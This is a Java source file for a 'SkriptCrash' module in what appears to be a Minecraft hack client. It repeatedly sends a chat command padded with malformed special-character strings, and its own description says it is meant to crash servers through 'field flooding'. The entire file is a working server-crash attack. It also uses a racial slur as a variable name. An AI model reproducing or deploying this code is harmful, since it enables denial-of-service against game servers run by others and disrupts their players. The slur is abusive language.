package net.shadow.feature.module.crash;

import net.minecraft.world.World;
import net.shadow.Shadow;
import net.shadow.feature.base.Module;
import net.shadow.feature.base.ModuleType;
import net.shadow.feature.configuration.CustomValue;
import net.shadow.feature.configuration.SliderValue;

public class SkriptCrash extends Module {
    static World w;
    final SliderValue pop5 = this.config.create("Delay", 20, 1, 100, 1);
    final CustomValue<String> nigga = this.config.create("Command", "/playtime");
    int ticks = 0;

    public SkriptCrash() {
        super("SkriptCrash", "crash using field flooder", ModuleType.CRASH);
    }

    @Override
    public void onEnable() {
        w = Shadow.c.player.clientWorld;
    }

    @Override
    public void onDisable() {
    }

    @Override
    public void onUpdate() {
        ticks++;
        if (w != Shadow.c.player.clientWorld) {
            this.setEnabled(false);
            return;
        }
        if (ticks % (int) Math.round(pop5.getThis()) == 0) {
            Shadow.c.player.sendChatMessage(nigga.getThis() + " %¤#\"%¤#\"%¤#\"%¤#");
        }
    }

    @Override
    public void onRender() {

    }
}

